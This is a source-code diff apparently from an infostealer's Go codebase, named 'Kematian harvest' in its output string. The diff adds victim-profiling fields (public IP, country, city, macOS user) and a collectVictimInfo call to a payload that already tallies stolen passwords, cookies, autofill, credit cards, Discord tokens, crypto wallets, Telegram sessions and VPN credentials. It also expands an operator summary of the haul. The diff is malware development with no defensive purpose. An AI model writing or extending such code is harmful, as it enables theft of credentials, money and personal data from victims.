@@ -8,11 +8,16 @@ import (
 )
 
 type harvestPayload struct {
-	Hostname string                    `json:"hostname"`
-	OS       string                    `json:"os"`
-	Arch     string                    `json:"arch"`
-	Result   *recovery.CollectionResult `json:"result"`
-	Seeds    []recovery.SeedResult     `json:"seeds,omitempty"`
+	Hostname    string                     `json:"hostname"`
+	OS          string                     `json:"os"`
+	Arch        string                     `json:"arch"`
+	PublicIP    string                     `json:"publicIp,omitempty"`
+	Country     string                     `json:"country,omitempty"`
+	CountryCode string                     `json:"countryCode,omitempty"`
+	City        string                     `json:"city,omitempty"`
+	MacUser     string                     `json:"macUser,omitempty"`
+	Result      *recovery.CollectionResult `json:"result"`
+	Seeds       []recovery.SeedResult      `json:"seeds,omitempty"`
 }
 
 func fullCollectOptions() recovery.CollectOptions {
@@ -61,12 +66,19 @@ func runHarvest(hostname string) (*harvestPayload, error) {
 	}
 	result.PasswordCandidates = recovery.AppendExtraPasswordCandidates(result.PasswordCandidates, result)
 
+	publicIP, country, countryCode, city, macUser := collectVictimInfo()
+
 	return &harvestPayload{
-		Hostname: hostname,
-		OS:       runtime.GOOS,
-		Arch:     runtime.GOARCH,
-		Result:   result,
-		Seeds:    seeds,
+		Hostname:    hostname,
+		OS:          runtime.GOOS,
+		Arch:        runtime.GOARCH,
+		PublicIP:    publicIP,
+		Country:     country,
+		CountryCode: countryCode,
+		City:        city,
+		MacUser:     macUser,
+		Result:      result,
+		Seeds:       seeds,
 	}, nil
 }
 
@@ -76,7 +88,7 @@ func harvestSummary(p *harvestPayload) string {
 	}
 	r := p.Result
 	return formatSummary(
-		p.Hostname, p.OS, p.Arch,
+		p.Hostname, p.OS, p.Arch, p.PublicIP, p.CountryCode, p.Country, p.MacUser,
 		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
 		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
 		len(r.Wallets), len(r.Keys), len(r.Telegram), len(r.AppCredentials),
@@ -103,8 +115,22 @@ func countVPNs(v *recovery.VPNResult) int {
 	return len(v.NordVPN) + len(v.WireGuard) + len(v.OpenVPN) + len(v.Mullvad)
 }
 
-func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
-	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
+func formatSummary(host, osName, arch, publicIP, countryCode, country, macUser string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, tg, apps, gaming, vpns, candidates, seeds int) string {
+	identity := "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n"
+	if publicIP != "" || macUser != "" || countryCode != "" {
+		identity += "ip: " + fallback(publicIP, "unknown")
+		if countryCode != "" {
+			identity += " | country: " + countryCode
+			if country != "" && country != countryCode {
+				identity += " (" + country + ")"
+			}
+		}
+		if macUser != "" {
+			identity += " | user: " + macUser
+		}
+		identity += "\n"
+	}
+	return identity +
 		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
 		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
 		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
@@ -125,6 +151,13 @@ func appendMacLoginCandidate(candidates []recovery.PasswordCandidateResult, pass
 		})
 	}
 	return candidates
+}
+
+func fallback(value, def string) string {
+	if value != "" {
+		return value
+	}
+	return def
 }
 
 func itoa(n int) string {
